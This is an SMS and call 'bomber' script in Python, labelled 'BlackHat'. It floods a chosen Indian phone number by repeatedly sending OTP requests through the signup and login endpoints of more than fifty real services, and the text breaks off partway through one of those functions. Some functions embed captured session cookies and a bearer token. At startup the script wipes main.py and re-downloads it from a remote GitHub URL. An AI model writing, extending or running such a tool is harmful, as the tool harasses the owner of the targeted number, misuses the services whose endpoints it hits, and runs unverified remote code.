from time import sleep
import os , sys

os.system("clear")

try:
         import colorama
         import requests
         
except ImportError:
             os.system("pip install colorama")
             os.system("pip install requests")
             
os.system("clear")

from colorama import Style , Fore
import requests

# AUTO UPDATE AND DELETE 

print("  Starting....")
os.system("rm -rf main.py >/dev/null 2>&1")
os.system("wget https://raw.githubusercontent.com/KBVault/kb/main/main.py >/dev/null 2>&1")
os.system("clear")

# COLORAMA COLORS

Red = Style.BRIGHT + Fore.RED
Blue = Style.BRIGHT + Fore.BLUE
Cyan = Style.BRIGHT + Fore.CYAN
White = Style.BRIGHT + Fore.WHITE
Green = Style.BRIGHT + Fore.GREEN
Yellow = Style.BRIGHT + Fore.YELLOW

# COLORAMA COLORS RESET

Reset = Style.RESET_ALL

# SYMBOL INSTRUCTIONS

s_i_1 = "[ "
s_i_2 = "] "
s_i_3 = "x "
s_i_4 = "|| "
s_i_5 = "└─> "
s_i_6 = "└─ "
s_i_7 = "└─ "
s_i_8 = "1 "
s_i_9 = "2 "
s_i_10 = "3 "
s_i_11 = "4 "
s_i_12 = "5 "
s_i_13 = " >>> "
s_i_14 = "( "
s_i_15 = ")"
s_i_16 = "91 "

# MENU INSTRUCTIONS

m_i_1 = "BlackHat "
m_i_2 = "Sms-Bomb v3"
m_i_3 = "Call-Bomb v3"
m_i_4 = "Custom-Sms v3"
m_i_5 = "Update"
m_i_6 = "Exit"

# ERROR INSTRUCTIONS

e_i_1 = "Wrong Option Script Restarting....."

e_i_2 = "Invalid Number Script Restarting....."

e_i_3 = "Blank Option Script Restarting....."

e_i_4 = "Blank Number Script Restarting....."

# HELP INSTRUCTIONS 

o_i_1 = "Attack Started Number"
o_i_2 = "Message Send Successfully "
o_i_3 = "Message Not Send"
o_i_4 = "[+] PRESS CTRL + C TO STOP [+]"

# INPUT INSTRUCTIONS

i_i_1 = "Select Options"
i_i_2 = "Enter The Number "
i_i_3 = "Enter The Custom Msg"
i_i_4 = "Restart or Exit [y/n]"

# BANNER FUNCTION

def banner():
       
       data = '''

╭╮╭━┳━━┳╮╱╱╭╮╱╱╭━╮╱╭┳━━━┳━━━━╮╭━━╮╭━━━┳━╮╭━┳━━╮╭━━━┳━━━╮
┃┃┃╭┻┫┣┫┃╱╱┃┃╱╱┃┃╰╮┃┃╭━━┫╭╮╭╮┃┃╭╮┃┃╭━╮┃┃╰╯┃┃╭╮┃┃╭━━┫╭━╮┃
┃╰╯╯╱┃┃┃┃╱╱┃┃╱╱┃╭╮╰╯┃╰━━╋╯┃┃╰╯┃╰╯╰┫┃╱┃┃╭╮╭╮┃╰╯╰┫╰━━┫╰━╯┃
┃╭╮┃╱┃┃┃┃╱╭┫┃╱╭┫┃╰╮┃┃╭━━╯╱┃┃╱╱┃╭━╮┃┃╱┃┃┃┃┃┃┃╭━╮┃╭━━┫╭╮╭╯
┃┃┃╰┳┫┣┫╰━╯┃╰━╯┃┃╱┃┃┃╰━━╮╱┃┃╱╱┃╰━╯┃╰━╯┃┃┃┃┃┃╰━╯┃╰━━┫┃┃╰╮
╰╯╰━┻━━┻━━━┻━━━┻╯╱╰━┻━━━╯╱╰╯╱╱╰━━━┻━━━┻╯╰╯╰┻━━━┻━━━┻╯╰━╯
'''
       data_color = Cyan + data + Reset
       print(data_color,"\n")
       
# SYMBOL COLOR INSTRUCTIONS

s_c_i_1 = Cyan + s_i_1 + Reset
s_c_i_2 = Cyan + s_i_2 + Reset
s_c_i_3 = White + s_i_3 + Reset
s_c_i_4 = Cyan + s_i_4 + Reset
s_c_i_5 = Cyan + s_i_5 + Reset
s_c_i_6 = Cyan + s_i_6 + Reset
s_c_i_7 = Cyan + s_i_7 + Reset
s_c_i_8 = White + s_i_8 + Reset
s_c_i_9 = White + s_i_9 + Reset
s_c_i_10 = White + s_i_10 + Reset
s_c_i_11 = White + s_i_11 + Reset
s_c_i_12 = White + s_i_12 + Reset
s_c_i_13 = Cyan + s_i_13 + Reset
s_c_i_14 = Cyan + s_i_14 + Reset
s_c_i_15 = Cyan + s_i_15 + Reset
s_c_i_16 = White + s_i_16 + Reset

# SET MENU INSTRUCTIONS 

sms_bomb = s_c_i_5 + s_c_i_1 + s_c_i_8 + s_c_i_2 + White + m_i_1 + Reset + s_c_i_4 + White + m_i_2 + Reset

call_bomb = s_c_i_5 + s_c_i_1 + s_c_i_9 + s_c_i_2 + White + m_i_1 + Reset + s_c_i_4 + White + m_i_3 + Reset

custom_sms = s_c_i_5 + s_c_i_1 + s_c_i_10 + s_c_i_2 + White + m_i_1 + Reset + s_c_i_4 + White + m_i_4 + Reset

update = s_c_i_5 + s_c_i_1 + s_c_i_11 + s_c_i_2 + White + m_i_1 + Reset + s_c_i_4 + White + m_i_5 + Reset

exit = s_c_i_5 + s_c_i_1 + s_c_i_12 + s_c_i_2 + White + m_i_1 + Reset + s_c_i_4 + White + m_i_6 + Reset

# SET INPUT INSTRUCTIONS

option_color = s_c_i_7 + White + i_i_1 + Reset + s_c_i_13 + White

number_color = s_c_i_1 + s_c_i_3 + s_c_i_2 + i_i_2 + s_c_i_14 + s_c_i_16 + s_c_i_15 + s_c_i_13 + White

msg_color = s_c_i_1 + s_c_i_3 + s_c_i_2 + i_i_3 + s_c_i_13 + White

back_color = s_c_i_7 + i_i_4 + s_c_i_13 + White

# SET HELP INSTRUCTIONS

attack_color = s_c_i_6 + White + o_i_1 + Reset + s_c_i_13

program_stop = Cyan + o_i_4

msg_send = s_c_i_6 + Cyan + o_i_2 + Reset

msg_not_send = s_c_i_6 + Yellow + o_i_3 + Reset

# SET ERROR INSTRUCTIONS 

wrong_option = s_c_i_5 + e_i_1
invalid_number = s_c_i_5 + e_i_2
blank_option = s_c_i_5 + e_i_3
blank_number = s_c_i_5 + e_i_4

# PRINT BANNER AND MENU 

banner()
print(sms_bomb)
print(call_bomb)
print(custom_sms)
print(update)
print(exit)
print("\n")


option = input(option_color)


# SMS API

'''--------------------------------------------------------------'''

# Rummy api

def sms_1():

      url = "https://www.rummycircle.com/api/fl/auth/v3/getOtp"
      
      data = {
    "mobile": number,
    "deviceId": "d6be3862-7659-46c0-98b9-3d13328a243c",
    "deviceName": "",
    "refCode": "",
    "isPlaycircle": "false"
}

      headers = {
    "Content-Type": "application/json"
}

      response = requests.post(url, json=data, headers=headers)

# Flipkart api

def sms_2():

      url = "https://www.flipkart.com/api/5/user/otp/generate"
      
      headers = {
    "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
    "Origin": "https://www.flipkart.com",
    "Content-Type": "application/x-www-form-urlencoded"
}
      
      data = {
    "loginId": "+91" + number
}

      response = requests.post(url, headers=headers, data=data)

# Confirmtkt api

def sms_3():

      url = "https://securedapi.confirmtkt.com/api/platform/register"

      data = {
    "newOtp": "true",
    "mobileNumber": number
}

      response = requests.get(url, params=data)

# Housing api

def sms_4():

      url = "https://login.housing.com/api/v2/send-otp"

      data = {
    "phone": number
}

      headers = {
    "Content-Type": "application/json",
}

      response = requests.post(url, json=data, headers=headers)

# Byjusc api

def sms_5():
       
      url = "https://identity.tllms.com/api/request_otp"
      
      data = {
    "phone": "+91-"+number,
    "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"
}

      response = requests.post(url, json=data)

# Moglix api

def sms_6():
       
       url = "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2"
       
       data = {"email":"","phone": number ,"type":"p","source":"signup","buildVersion":"25.29","device":"mobile"}
       
       response = requests.post(url,json=data)

# Aakash api

def sms_7():

      url = "https://iacst.aakash.ac.in/anthe/global-otp-verify"
      
      payload = {
    'mobileparam': number,
    'global_data_id': 'anthe-otp',
    'student_name': '',
    'corpid': 'undefined'
}

      response = requests.post(url, data=payload)

# Irsmsa api

def sms_8():
       
       url = "https://railmadad.indianrailways.gov.in/madad/FetchData?mobile="+number+"&email=&fetchdatatype=userotp"
       
       response = requests.get(url)


# Unacademy api

def sms_9():
       
       url = "https://unacademy.com/api/v3/user/user_check/?enable-email=true"
       
       data = {"phone": number ,"country_code":"IN","otp_type":1,"email":"","send_otp":True,"is_un_teach_user":False}
       
       response = requests.post(url,json=data)

# Rapido api

def sms_10():
       
       url = "https://customer.rapido.bike/api/otp"
       
       data = {"mobile": number}      
       
       response = requests.post(url,json=data)

# Pwalla api

def sms_11():
       
       url = "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189"
       
       data = {
  "mobile": number,
  "countryCode": "+91",
  "firstName": "Jarvis",
  "lastName": "" }
  
       response = requests.post(url,json=data)

# Entri api

def sms_12():

      url = "https://entri.app/api/v3/users/check-phone/"

      headers = {
    "Host": "entri.app",
    "Content-Length": "25",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Client": "web",
    "User-Language": "hi",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": '"Android"',
    "Origin": "https://webapp.entri.app",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://webapp.entri.app/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
    "Cookie": (
        "_gcl_au=1.1.892674944.1705134652; "
        "_fbp=fb.1.1705134652145.1810880738; "
        "_gid=GA1.2.2122718671.1705134654; "
        "_clck=3nmn7j%7C2%7Cfid%7C0%7C1473; "
        "_hjFirstSeen=1; "
        "_hjIncludedInSessionSample_2883549=0; "
        "_hjSession_2883549=eyJpZCI6ImVjMzVhYjk4LTRhNzItNDllNi05YmQ0LWIyYzBjOWI4YjNhMSIsImMiOjE3MDUxMzQ2NTUxMjQsInMiOjAsInIiOjAsInNiIjowfQ==; "
        "_hjAbsoluteSessionInProgress=0; "
        "_ga=GA1.1.1357392589.1705134653; "
        "_ga_0ZC25J7WK3=GS1.1.1705134652.1.1.1705134666.0.0.0; "
        "_hjSessionUser_2883549=eyJpZCI6ImI2ZTBmYjQzLWY2MGMtNWNkYi04ZDZkLTc4MTQyN2Q9; "
        "_ga_2ZHJ5NB915=GS1.1.1705134668.1.0.1705134668.0.0.0; "
        "_clsk=lik7pq%7C1705134668098%7C2%7C1%7Ce.clarity.ms%2Fcollect; "
        "mp_5830f8797eddcab822bff041d7ecd1d7_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18d01f23d9b1b46-0b0939f8477842-b457550-46500-18d01f23d9b1b46%22%2C%22%24device_id%22%3A%20%2218d01f23d9b1b46%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fentri.app%2F%22%2C%22%24initial_referring_domain%22%3A%20%22entri.app%22%7D; "
        "moe_uuid=a8590dd4-7534-4b9f-b521-6b92158414ab; "
        "_fw_crm_v=bfb96756-86e2-4557-a9ff-cf5171fee4b0"
    ),
}

      data = {"phone":"+91"+number}

      response = requests.post(url, headers=headers, json=data)

# Postpe api

def sms_13():
       
      url = "https://api-consumer.bharatpe.in/generic/customer/otp/generate"
      headers = {
    'Host': 'api-consumer.bharatpe.in',
    'content-length': '91',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'clientid': 'postpe',
    'content-type': 'application/json; charset=UTF-8',
    'sec-ch-ua-mobile': '?1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform': '"Android"',
    'accept': '*/*',
    'origin': 'https://postpe.app',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://postpe.app/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8'
}

      data = {"hashKey": "", "mobile": number, "serviceName": "POSTPE_LEAD_GENERATION", "type": "MOBILE"}
      response = requests.post(url, headers=headers, json=data)

# Adaotp api

def sms_14():       

      url = "https://www.adda52.org.in/api/v1/offers/user/sendOtp"
      
      data = {
    'user': number,
    'clientName': 'web',
    'domainKey': 'Adda52.org.in',
    'source': 'landing_page'
}

      response = requests.post(url, data=data)

# Lsmeat api

def sms_15():
       
       url = "https://www.licious.in/api/login/signup"
       
       data = {"phone": number,"captcha_token": None}
       
       response = requests.post(url,json=data)

# Ekacare api

def sms_16():
       
       url = "https://cowin.eka.care/v2/generate_otp"
       
       data = {"mobile_no":"+91"+number,"allow_whatsapp":False,"auto_retry":False}
       
       response = requests.post(url,json=data)

# desifarm api

def sms_17():
       
       url = "https://newnode.desifarmsindia.in/desi_farm/web_api/sendOTPWeb"
       
       data = {"Customer_Mobile_Number": number}
       
       response = requests.post(url,json=data)

# Indmart api

def sms_18():
       
       url = "https://m.indiamart.com/ajaxrequest/identified/common/otpVerification"
       
       data = {
  "user": number,
  "screenName": "IMOB MESSAGES",
  "type": "OTPGEN",
  "authCode": "",
  "glusr_id": "209934899",
  "ciso": "IN",
  "email": "",
  "user_mobile_country_code": "91",
  "user_country": "India",
  "userIp": "157.35.48.125",
  "OTPResend": 0,
  "emailVerify": "",
  "source": "",
  "msg_key": 1,
  "attribute_id": "",
  "verifyUser": False,
  "glid": "209934899"
}
       response = requests.post(url,json=data)

# Binsar api

def sms_19():
       
       url = "https://binsar.api.milkmanapps.com/v1/users/otp-generate"
       
       data = {"phone_no": number}
       
       response = requests.post(url,json=data)

# Whytef api

def sms_20():
       
       url = "https://whytefarms.api.milkmanapps.com/v1/users/otp-generate"
       
       data = {"phone_no": number}
       
       response = requests.post(url,json=data)

# Mlkpot api 

def sms_21():
       
       url = "https://milkpot.api.milkmanapps.com/v1/users/otp-generate"
       
       data = {"phone_no": number}
       
       response = requests.post(url,json=data)

# Prmilk api

def sms_22():
       
      url = "https://mumbai.provilac.com/restapi/customer/sendOTP/v2"
      params = {
    "mobileNumber": number,
    "cityName": "Mumbai",
    "resendOtp": "false"
}

      response = requests.post(url, params=params)

# Iorgnc api

def sms_23():
       
       url = "https://iorganic.api.milkmanapps.com/v1/users/otp-generate"
       
       data = {"phone_no": number}
       
       response = requests.post(url,json=data)

# Mrmilk api

def sms_24():
       
       url = "https://mrmilk.api.milkmanapps.com/v1/users/otp-generate"
       
       data = {"phone_no":number}
       
       response = requests.post(url,json=data)

# Medibd api

def sms_25():
       
       url = "https://loginprod.medibuddy.in/unified-login/user/register"
       
       data = {
  "source": "medibuddyInWeb",
  "platform": "medibuddy",
  "phonenumber": number,
  "flow": "Retail-Login-Home-Flow",
  "idealLoginFlow": False,
  "advertiserId": "50e46642-ad8c-Lbbf-8c21-d8fe0af17bc8",
  "mbUserId": None
}    
       response = requests.post(url,json=data)

# Pheasy api

def sms_26():
       
      url = "https://pharmeasy.in/apt-api/login/send-otp"
      
      headers = {
    "Host": "pharmeasy.in",
    "content-length": "22",
    "x-instana-t": "ed1b3083eb6f1778",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?1",
    "x-instana-l": "1,correlationType=web;correlationId=ed1b3083eb6f1778",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "x-instana-s": "ed1b3083eb6f1778",
    "sec-ch-ua-platform": '"Android"',
    "origin": "https://pharmeasy.in",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://pharmeasy.in/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    "cookie": "XdI=emCt-TNlRtopNgileU87f; XPESD=%7B%22session_id%22%3A%22s_w_emCt-TNlRtopNgileU87f_1705163728000%22%2C%22session_id_flag%22%3A%22ct_id%22%2C%22referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22session_start_time%22%3A%222024-01-13T16%3A35%3A28.479Z%22%7D; XPESS_v2=s_w_emCt-TNlRtopNgileU87f_1705163728000; _gcl_au=1.1.751345341.1705163733; dtm_token_sc=AQEK7SiezulnwAEFKoN_AQEBAQA; _ga_J4XE9SW84F=GS1.1.1705163733.1.0.1705163733.60.0.0; dtm_token=AQEK7SiezulnwAEFKoN_AQBBbQE; _ga=GA1.2.2083918859.1705163733; _gid=GA1.2.1560576070.1705163733; _gat_UA-60621013-1=1; _uetsid=c5c09510b23111ee87cc71d9bcfb6015; _uetvid=c5c3a9c0b23111ee94167b17741eb70a; WZRK_G=a00f32acc4e14da39e80ffc893020be7; _ga_XJY1F0EN7Z=GS1.2.1705163734.1.1.1705163734.60.0.0; _ga_YLL6W14B3J=GS1.2.1705163734.1.1.1705163734.0.0.0; WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A1%2C%22s%22%3A1705163734%2C%22t%22%3A1705163738%7D; _fbp=fb.1.1705163739057.1895290643"
}

      data = {"param": number}

      response = requests.post(url, headers=headers, json=data)

# Netmed api

def sms_27():
       
       url = "https://m.netmeds.com/mst/rest/v1/id/details/"+number
       
       response = requests.get(url)

# Ionemg api

def sms_28():
       
       url = "https://www.1mg.com/auth_api/v6/create_token"
       
       data = {
  "number": number,
  "is_corporate_user": False,
  "is_doctor": True
}
       response = requests.post(url,json=data)

# Vedchp api

def sms_29():
    
      url = "https://admin.vedistry.com/graphql"
      headers = {"Content-Type": "application/json"}

      data = {
    "query": f"\nmutation {{\n    createAccountOTP(\n        mobilenumber:\"91{number}\",\n        websiteId:1\n    )\n        {{\n            status\n            message\n        }}\n}}"
}

      response = requests.post(url, json=data, headers=headers)

# Suppra api

def sms_30():

      api_url = "https://www.suprameds.in/login/send_custom_otp"
      
      api_data = {
    "country_code": "+91",
    "country_short_name": "in",
    "mobile": number
}

      response = requests.post(api_url, data=api_data)

# Rlgare api

def sms_31():
       
       url = "https://insta.religareonline.com/accountapi/api/values/SendMobileOTP_V2"
       
       data = {"MobileNo": number}
       
       response = requests.post(url,data=data)

# Fvasia api

def sms_32():
       
       url = "https://betaprism-api.shoonya.com/api/create/lead"
       
       data = {
  "email": "rahulsingh78@gmail.com",
  "mobile": number,
  "pan_number": ""
}
       response = requests.post(url,json=data)

# Ffyears api

def sms_33():
       
       url = "https://api-a1.fyers.in/signup/v2/send-otp"
       
       data = {
  "mobile": number,
  "auto_read": ""
}
       response = requests.post(url,json=data)

# Indptp api

def sms_34():
       
       url = "https://prod-api.indiap2p.com/api/v1/signup"
       
       data = {
  "phoneNo": number,
  "referralCode": None,
  "type": "lender"
}

       response = requests.post(url,json=data)

# Sugarc api

def sms_35():
       
      url = "https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp"

      headers = {
    "Host": "prod.api.sugarcosmetics.com",
    "Content-Length": "69",
    "os_type": "2",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": '"Android"',
    "Origin": "https://in.sugarcosmetics.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://in.sugarcosmetics.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
}

      data = {
  "phone_no": "+91"+number,
  "website": True,
  "is_guest_checkout": False
}

      response = requests.post(url, headers=headers,json=data)

# Vedntu api

def sms_36():
       
      url = "https://user.vedantu.com/user/preLoginVerification"
      
      headers = {
    "Host": "user.vedantu.com",
    "Content-Length": "90",
    "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "Sec-Ch-Ua-Platform": "Android",
    "Sec-Ch-Ua-Mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": "https://www.vedantu.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.vedantu.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
    "Cookie": (
        'LAST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; '
        'FIRST_SOURCE_UTMS={"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}; '
        '_gcl_au=1.1.7276820.1705244104; amp_832ba5=ICLaWMiD6Ow4dkcLOGHglp...1hk47g5ie.1hk47g637.2.0.2; '
        '_fbp=fb.1.1705244105071.1268900562; _ga=GA1.1.968335124.1705244107; '
        '_ga_35N6JBZRVC=GS1.1.1705244106.1.1.1705244109.57.0.0; _uetsid=e95a1ba0b2ec11ee9f07db944308494d; '
        '_uetvid=e95a7a60b2ec11ee843ba7aad764dbdc; amp_832ba5_vedantu.com=ICLaWMiD6Ow4dkcLOGHglp...1hk47g5ie.1hk47gfik.3.0.3; '
        'auth-token=8Hq63zA7QQVD8MmU'
    )
}

      data = {
  "email": None,
  "phoneCode": "+91",
  "phoneNumber": number,
  "version": 2,
  "ver": "1704961334"
}
      
      response = requests.post(url, headers=headers,json=data)

# Etuint api

def sms_37():
       
       url = "https://e-tuitions.com/api/auth/register/requestotp"
       
       data = {
  "firstName": "Jarvis ",
  "lastName": "Boss ",
  "email": "rahulsingh78@gmail.com",
  "mobile": number,
  "type": "STUDENT",
  "agree": True,
  "referredFrom": "",
  "countryCode": "+91"
}

       response = requests.post(url,json=data)

# Fabotp api

def sms_38():
       
      url = "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR"

      headers = {
    "Host": "apisap.fabindia.com",
    "Content-Length": "84",
    "Sec-Ch-UA": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "Sec-Ch-UA-Mobile": "?1",
    "Authorization": "Bearer jKP5UqgFKQsXVMpRKhMyF0XgIP8",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "X-Anonymous-Consents": '%5B%7B%22templateCode%22%3A%22MARKETING_NEWSLETTER%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%5D',
    "Accept": "application/json, text/plain, */*",
    "Sec-Ch-UA-Platform": '"Android"',
    "Origin": "https://www.fabindia.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.fabindia.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
}

      data = {
  "mobileDailCode": "+91",
  "mobileNumber": number,
  "isLogin": False,
  "isSignUp": True
}
      
      response = requests.post(url, headers=headers,json=data)

# Lfsstl api

def sms_39():
       
       url = "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP"
       
       data = {"signInMobile":"+91"+number}
       
       response = requests.post(url,json=data)

# Havell api

def sms_40():
       
       url = "https://shop.havells.com/graphql"
       
       data = {
  "operationName": "sendOtp",
  "variables": {
    "mobile": number
  },
  "query": "mutation sendOtp($mobile: String!) {\n  sendOtp(mobile: $mobile) {\n    mobile\n    message\n    __typename\n  }\n}\n"
}

       response = requests.post(url,json=data)

# Itcstr api

def sms_41():
       
       url = "https://api2.itcstore.in/graphql"
       
       data = {
  "operationName": "generateOtp",
  "variables": {
    "mobilenumber": number,
    "otpfor": "registration",
    "resend": True
  },
  "query": "query generateOtp($mobilenumber: String, $resend: Boolean, $otpfor: String, $otp: String) {\n  generateOtp(\n    mobilenumber: $mobilenumber\n    resend: $resend\n    otpfor: $otpfor\n    otp: $otp\n  ) {\n    is_success\n    msg\n    ResponseCode\n    time_unit\n    time_left\n    __typename\n  }\n}"
}

       response = requests.post(url,json=data)

# Ssstor api 

def sms_42():
       
       url = "https://gateway.streetstylestore.com/gateway/v1/"
       
       data = {"gateway_action":"customer/checkCustomerMobile","mobile":number,"site":"sss"}
       
       response = requests.post(url,json=data)

# Kessaa api

def sms_43():
       
      url = "https://www.kessa.com/wp-admin/admin-ajax.php"

      data = {"action":"validate_send_phone_email_otp_kessa_custom","un":"+91"+number,"pc":"+91","pn":number,"cc":"IN","ei":"rahulsingh78@gmail.com","ft":"login_user_with_otp","up":"0","at":"2","resend":"0","nonce":"aee1771656"}

      response = requests.post(url,data=data)

# Urbncp api

def sms_44():
       
       url = "https://www.urbanclap.com/api/v2/growth/profile/generateOTP"
       
       data = {
  "country_id": "IND",
  "phone": {
    "isd_code": "+91",
    "phone_wo_isd": number
  },
  "device_type": "customer"
}

       response = requests.post(url,json=data)

# Lllotp api

def sms_45():
       
      url = "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp"

      headers = {
    "Host": "omqkhavcch.execute-api.ap-south-1.amazonaws.com",
    "content-length": "97",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "action": "sendOTP",
    "sec-ch-ua-platform": '"Android"',
    "shop_name": "srisritattva-in.myshopify.com",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "*/*",
    "origin": "https://www.srisritattva.com",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.srisritattva.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
}

      data = {"username":"+91"+number,"type":"mobile","domain":"www.srisritattva.com","recaptcha_token":""}

      response = requests.post(url, headers=headers,json=data)

# Ecroma api

def sms_46():
       
      url = "https://api.tatadigital.com/api/v2/sso/check-phone-croma"

      headers = {
    "Host": "api.tatadigital.com",
    "content-length": "41",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "accept": "application/json, text/plain, */*",
    "sec-ch-ua-platform": '"Android"',
    "client_id": "CROMA-WEB-APP",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "origin": "https://www.croma.com",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.croma.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    "cookie": "SESSION=YTRhYTVhZWQtMzNkNy00NWQ3LThkZjItMDBiNmU3NzI0N2Ey"
}

      data = {"countryCode":"91","phone":number}

      response = requests.post(url, headers=headers, json=data)

# Ustraa api

def sms_47():
       
       url = "https://backend.ustraa.com/rest/V1/api/registrationsendsms?receiverPhoneNumber="+number+"&email=rahulsingh68@gmail.com&storeId=2&type=otp"
       
       response = requests.get(url)

# Netmed api

def sms_48():
       
       url = "https://m.netmeds.com/mst/rest/v1/id/details/"+number
       
       response = requests.get(url)

# Whpecm api

def sms_49():
       
       url = "https://www.whpjewellers.com/Checkout.aspx/SendOTP"
       
       data = {
  "countryCode": "+91",
  "Mobile": number,
  "SendOn": "SMS"
}

       response = requests.post(url,json=data)

# Sstche api 

def sms_50():      

      url = "https://www.saravanastores.in/index.php?fc=module&module=wkmobilelogin&controller=phoneverification"
      
      data = {
    "ajax": 1,
    "phone_number": number,
    "id_customer": "",
    "id_country": 110,
    "action": "sendOTP"
}

      response = requests.post(url, data=data)

# Mcdlvy api

def sms_51():
       
       url = "https://be.mcdelivery.co.in/auth/otp/"+number+"/"
       
       resposne = requests.get(url)

# Myzoop api

def sms_52():
       
      url = "https://webapi.zoopindia.com/v2/customers/login"

      headers = {
    "Host": "webapi.zoopindia.com",
    "Connection": "keep-alive",
    "Content-Length": "45",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "source": "Mobile-Web",
    "sec-ch-ua-mobile": "?1",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "deviceInfo": "[object Object]",
    "sec-ch-ua-platform": '"Android"',
    "Origin": "https://www.zoopindia.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.zoopindia.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
}

      data = {
  "mobile": number,
  "source": "Mobile-Web"
}

      response = requests.post(url, headers=headers, json=data)

# Barkyd api

def sms_53():
       
